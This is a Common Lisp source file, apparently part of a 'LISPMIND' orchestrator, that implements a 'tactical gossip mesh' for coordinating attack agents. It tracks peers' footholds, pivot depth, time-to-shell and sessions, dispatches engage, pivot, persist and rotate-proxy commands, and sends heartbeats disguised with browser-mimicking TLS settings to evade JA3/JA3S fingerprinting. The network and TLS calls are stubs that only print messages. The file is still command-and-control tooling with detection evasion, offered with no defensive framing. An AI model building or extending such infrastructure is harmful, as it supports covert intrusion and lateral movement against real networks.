  "Handle an incoming tactical command.

   CMD-DATA is the plist from a parsed tactical command.
   Checks if the command is targeted at this agent (or broadcast \"*\")
   and dispatches to the appropriate handler.

   Arguments:
     CMD-DATA — Plist with :ID :TGT :PARAMS :PRI keys.

   Returns: Result of command handler, or NIL if not targeted."
  (let* ((target (getf cmd-data :tgt))
         (my-id (or (and (boundp '*tactical-agent-id*) *tactical-agent-id*)
                    "unknown"))
         (cmd-id (getf cmd-data :id))
         (params (getf cmd-data :params)))
    (when (or (string= target "*")
              (string= target my-id))
      (format t "~&[TACTICAL-GOSSIP] Received command ~A: ~A~%"
              cmd-id params)
      (case cmd-id
        (:evacuate (format t "[TACTICAL] EVACUATE order received.~%"))
        (:pivot (format t "[TACTICAL] PIVOT to ~A~%"
                       (getf params :target-ip)))
        (:persist (format t "[TACTICAL] PERSIST order received.~%"))
        (:engage (format t "[TACTICAL] ENGAGE ~A~%"
                        (getf params :target-ip)))
        (:rotate-proxy (format t "[TACTICAL] ROTATE-PROXY order.~%"))
        (:retry (format t "[TACTICAL] RETRY last operation.~%"))
        (:sleep (format t "[TACTICAL] SLEEP for ~As.~%"
                       (getf params :delay-seconds 300)))
        (:wake (format t "[TACTICAL] WAKE order received.~%"))
        (otherwise (format t "[TACTICAL] Unknown command: ~A~%" cmd-id))))))

(defun get-tactical-peer-status ()
  "Return the current status of all known tactical peers.

   Returns a list of plists, one per peer:
     (:PEER-ID \"...\" :LAST-HEARTBEAT <ts> :SECONDS-AGO <n>
      :STATUS :ALIVE|:DEAD :FOOTHOLDS <count>)

   A peer is considered DEAD if its last heartbeat is older than
   3 heartbeat intervals (default: 15 seconds).

   Example:
     (get-tactical-peer-status)
     ;; => ((:PEER-ID \"agent-1\" :LAST-HEARTBEAT ... :STATUS :ALIVE ...))"
  (let ((now (get-universal-time))
        (dead-threshold (* 3 *heartbeat-interval-seconds*))
        (result nil))
    (maphash
     (lambda (peer-id last-ts)
       (let ((ago (- now last-ts)))
         (push (list :peer-id peer-id
                     :last-heartbeat last-ts
                     :seconds-ago ago
                     :status (if (< ago dead-threshold) :alive :dead)
                     :footholds (length (gethash peer-id
                                                *tactical-peer-footholds*
                                                '())))
               result)))
     *tactical-peer-liveness*)
    (sort result #'< :key (lambda (p) (getf p :seconds-ago)))))

(defun count-tactical-peers-alive ()
  "Return the number of currently alive tactical peers.

   A peer is alive if its last heartbeat is within 3 intervals.

   Returns: Integer count."
  (count-if
   (lambda (entry)
     (< (getf entry :seconds-ago)
        (* 3 *heartbeat-interval-seconds*)))
   (get-tactical-peer-status)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 8: Tactical Agent Status Variables — Dynamic State
;; ═══════════════════════════════════════════════════════════════════════════

(defvar *tactical-agent-status* :active
  "Current status of this agent for heartbeat reporting.
   One of: :ACTIVE :DEAD :PIVOTING :PERSISTING.
   Modified by agent code as operations progress.")

(defvar *tactical-pivot-depth* 0
  "Current pivot depth — how many hops from initial entry.
   0 = initial foothold, 1 = first pivot, etc.
   Max practical value: *MAX-PIVOT-DEPTH* (default 5).")

(defvar *tactical-tts-seconds* 0
  "Time-to-shell for the current operation in seconds.
   0 = no pending operation. Set by agent before engage.")

(defvar *tactical-targets-count* 0
  "Number of active targets this agent is currently engaging.
   Updated by the agent as targets are added/completed.")

(defvar *tactical-sessions-count* 0
  "Number of live sessions held by this agent.
   Updated as sessions are established or lost.")

(defvar *tactical-agent-id* "orch-default"
  "This agent's identifier for tactical gossip.
   Should be set to a unique string at init time.")

(defun set-tactical-agent-id (id)
  "Set this agent's tactical identifier to ID.

   Arguments:
     ID — String, unique agent identifier.

   Returns: The new ID."
  (setf *tactical-agent-id* id))

(defun set-tactical-status (status)
  "Set this agent's tactical status.

   Arguments:
     STATUS — Keyword: :ACTIVE :DEAD :PIVOTING :PERSISTING.

   Returns: The new status."
  (setf *tactical-agent-status* status))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 9: Tactical Diagnostics — Bandwidth and Mesh Health
;; ═══════════════════════════════════════════════════════════════════════════

(defun print-tactical-gossip-status ()
  "Print a full status report of the tactical gossip system.

   Shows: mode, bandwidth stats, peer count, peer status, and
   configuration parameters.

   Returns: Status plist (same as GET-GOSSIP-BANDWIDTH-STATS but
   with additional :PEERS and :CONFIG keys)."
  (let ((bw-stats (get-gossip-bandwidth-stats))
        (peers (get-tactical-peer-status))
        (alive (count-tactical-peers-alive)))
    (format t "~&═══════════════════════════════════════════════════════════════~%")
    (format t "  TACTICAL GOSSIP MESH v~A~%" *tactical-gossip-version*)
    (format t "═══════════════════════════════════════════════════════════════~%")
    (format t "  Mode:        ~A~%" (if *tactical-gossip-mode-p*
                                      "TACTICAL (low-bandwidth)"
                                      "NORMAL"))
    (format t "  Agent ID:    ~A~%" *tactical-agent-id*)
    (format t "  Status:      ~A (depth: ~D, TTS: ~Ds)~%"
            *tactical-agent-status*
            *tactical-pivot-depth*
            *tactical-tts-seconds*)
    (format t "  Bandwidth:   ~,1F% of ~D B/s limit~%"
            (getf bw-stats :utilization-%)
            (getf bw-stats :limit-bytes/sec))
    (format t "  Counter:     ~D bytes in ~Ds window~%"
            (getf bw-stats :counter)
            (getf bw-stats :window-seconds))
    (format t "  Throttled:   ~A~%" (getf bw-stats :throttled-p))
    (format t "  Peers:       ~D alive / ~D known~%"
            alive (length peers))
    (dolist (p peers)
      (format t "    ~A: ~A (~Ds ago, ~D footholds)~%"
              (getf p :peer-id)
              (getf p :status)
              (getf p :seconds-ago)
              (getf p :footholds)))
    (format t "  Heartbeat:   every ~Ds (~D bytes max)~%"
            *heartbeat-interval-seconds* *heartbeat-max-size*)
    (format t "  Command:     ~D bytes max~%" *command-max-size*)
    (format t "  State:       ~D bytes max~%" *state-update-max-size*)
    (format t "═══════════════════════════════════════════════════════════════~%")
    (append bw-stats
            (list :peers peers
                  :config (list :heartbeat-interval *heartbeat-interval-seconds*
                               :heartbeat-max *heartbeat-max-size*
                               :command-max *command-max-size*
                               :state-max *state-update-max-size*)))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 10: Convenience — Start/Stop with Orchestrator Integration
;; ═══════════════════════════════════════════════════════════════════════════

(defun start-tactical-gossip (orchestrator &key (heartbeat-interval 5))
  "Start tactical gossip mode integrated with an orchestrator.

   Extracts agent state from the orchestrator and starts the tactical
   gossip loop. Registers tactical topic callbacks.

   Arguments:
     ORCHESTRATOR       — The LISPMIND orchestrator instance.
     HEARTBEAT-INTERVAL — Seconds between heartbeats (default 5).

   Returns: T if started successfully.

   Example:
     (start-tactical-gossip *default-orchestrator* :heartbeat-interval 3)"
  (let ((agent-id (or (and (slot-exists-p orchestrator 'id)
                          (slot-value orchestrator 'id))
                     "orch-unknown")))
    (set-tactical-agent-id (princ-to-string agent-id))
    (enable-tactical-gossip-mode
     :heartbeat-interval heartbeat-interval
     :agent-id (princ-to-string agent-id))
    (register-tactical-callbacks)
    (format t "[TACTICAL-GOSSIP] Integrated with orchestrator ~A.~%"
            agent-id)
    t))

(defun stop-tactical-gossip ()
  "Stop tactical gossip mode.

   Calls DISABLE-TACTICAL-GOSSIP-MODE and clears peer state.

   Returns: T if stopped successfully."
  (disable-tactical-gossip-mode)
  (clrhash *tactical-peer-liveness*)
  (clrhash *tactical-peer-footholds*)
  (format t "[TACTICAL-GOSSIP] Peer state cleared.~%")
  t)


;;;; ═════════════════════════════════════════════════════════════════════════
;;;; Section 11: TLS Camouflage Integration (v2.5.1)
;;;; ═════════════════════════════════════════════════════════════════════════
;;;; These functions integrate the tactical gossip mesh with the TLS
;;;; camouflage subsystem. Heartbeats and commands are sent with
;;;; browser-matching cipher suites and extensions to evade JA3/JA3S
;;;; fingerprinting analysis.

(defun send-camouflaged-heartbeat (agent-id &key status pivot-depth browser os)
  "Send a tactical heartbeat with full TLS camouflage applied.

Wraps SEND-TACTICAL-HEARTBEAT with TLS camouflage parameter configuration.
Before sending the heartbeat, this function:
  1. Optionally reconfigures TLS parameters if BROWSER and OS are provided
  2. Sets the appropriate cipher suites for the selected browser profile
  3. Sets the appropriate TLS extensions for the selected browser profile
  4. Updates the User-Agent to match the TLS fingerprint
  5. Calls SEND-TACTICAL-HEARTBEAT with the agent state

If BROWSER and OS are not provided, uses the current TLS camouflage
configuration without changes.

Arguments:
  AGENT-ID    — String or symbol, the sending agent's identifier.
  STATUS      — Keyword: :ACTIVE :DEAD :PIVOTING :PERSISTING :INITIALIZING.
                Default: :ACTIVE.
  PIVOT-DEPTH — Integer 0-255, lateral movement depth. Default: 0.
  BROWSER     — Keyword or NIL. If non-NIL, reconfigure TLS to match
                this browser (:chrome :firefox :safari :edge).
  OS          — Keyword or NIL. If non-NIL, reconfigure TLS to match
                this OS (:windows :macos :linux).

If *RADIO-SILENCE-MODE-P* is T, returns :SILENCE without sending.

Returns: T if heartbeat sent successfully, NIL on failure, :SILENCE
         if radio silence is active.

Example:
  ;; Send with current camouflage settings
  (send-camouflaged-heartbeat \"agent-alpha\" :status :active :pivot-depth 2)

  ;; Send after switching to Safari/macOS profile
  (send-camouflaged-heartbeat \"agent-alpha\" :status :active
                            :browser :safari :os :macos)"
  ;; Check radio silence first
  (when (and (boundp '*radio-silence-mode-p*) *radio-silence-mode-p*)
    (format *trace-output* "[TACTICAL-GOSSIP] Heartbeat suppressed (radio silence).~%")
    (return-from send-camouflaged-heartbeat :silence))
  ;; Optionally reconfigure TLS for a different browser profile
  (when (and browser os
             (boundp '*tls-camouflage-enabled-p*)
             *tls-camouflage-enabled-p*
             (fboundp 'configure-gossip-tls-camouflage))
    (handler-case
        (configure-gossip-tls-camouflage :browser browser :os os)
      (error (e)
        (format *trace-output* "[TACTICAL-GOSSIP] TLS reconfig warning: ~A~%" e))))
  ;; Apply TLS camouflage settings to the connection layer
  (handler-case
      (when (and (boundp '*tls-current-cipher-suites*)
                 *tls-current-cipher-suites*
                 (fboundp 'configure-tactical-gossip-tls))
        (configure-tactical-gossip-tls
         *tls-current-cipher-suites*
         (or (and (boundp '*tls-current-extensions*) *tls-current-extensions*)
             '(:server_name t
               :supported_groups (:X25519 :SECP256R1 :SECP384R1)
               :application_layer_protocol_negotiation ("h2" "http/1.1")))))
    (error (e)
      (format *trace-output* "[TACTICAL-GOSSIP] TLS apply warning: ~A~%" e)))
  ;; Send the heartbeat through the standard tactical path
  (handler-case
      (send-tactical-heartbeat
       agent-id
       :status (or status :active)
       :pivot-depth (or pivot-depth 0)
       :tts-seconds (or (and (boundp '*tactical-tts-seconds*)
                            *tactical-tts-seconds*)
                       0)
       :targets-count (or (and (boundp '*tactical-targets-count*)
                              *tactical-targets-count*)
                         0)
       :sessions-count (or (and (boundp '*tactical-sessions-count*)
                               *tactical-sessions-count*)
                          0))
    (error (e)
      (format *trace-output* "[TACTICAL-GOSSIP] Camouflaged heartbeat failed: ~A~%" e)
      nil)))

(defun configure-tactical-gossip-tls (cipher-suites extensions)
  "Update the tactical gossip connection to use specified TLS parameters.

Configures the underlying TLS connection (if available) with the given
cipher suites and extensions. This changes the ClientHello that the
gossip mesh uses, which directly affects the JA3 fingerprint.

This function is called by CONFIGURE-GOSSIP-TLS-CAMOUFLAGE in
system-init-v2.5.lisp whenever the browser profile is changed.

Arguments:
  CIPHER-SUITES — List of cipher suite keywords in preference order.
                  Example: '(:TLS_AES_128_GCM_SHA256 :TLS_AES_256_GCM_SHA384 ...)
  EXTENSIONS    — Plist of TLS extension configurations.
                  Example: '(:server_name t :supported_groups (:X25519 ...))

Returns: T on success, NIL if TLS layer is not configurable.

Note: This is a configuration stub. In production, this function would
interface with the actual TLS library (e.g., CL+SSL, custom OpenSSL
bindings, or a C FFI bridge) to set the cipher list and extension data.
The stub logs the configuration for verification."
  (format t "[TACTICAL-GOSSIP-TLS] Configuring TLS parameters...~%")
  (format t "  Cipher suites (~D): ~{~A~^, ~}~%"
          (length cipher-suites)
          (mapcar #'symbol-name cipher-suites))
  (format t "  Extensions (~D keys): ~{~A~^, ~}~%"
          (/ (length extensions) 2)
          (loop for (k v) on extensions by #'cddr collect (symbol-name k)))
  ;; Stub: In production, this would call the TLS library
  ;; (cl+ssl:set-cipher-list cipher-suites)
  ;; (cl+ssl:set-extensions extensions)
  (format t "[TACTICAL-GOSSIP-TLS] TLS parameters configured (stub).~%")
  t)


;;;; ═════════════════════════════════════════════════════════════════════════
;;;; END OF GOSSIP-V2.4.LISP
;;;; With TLS Camouflage Integration (v2.5.1)
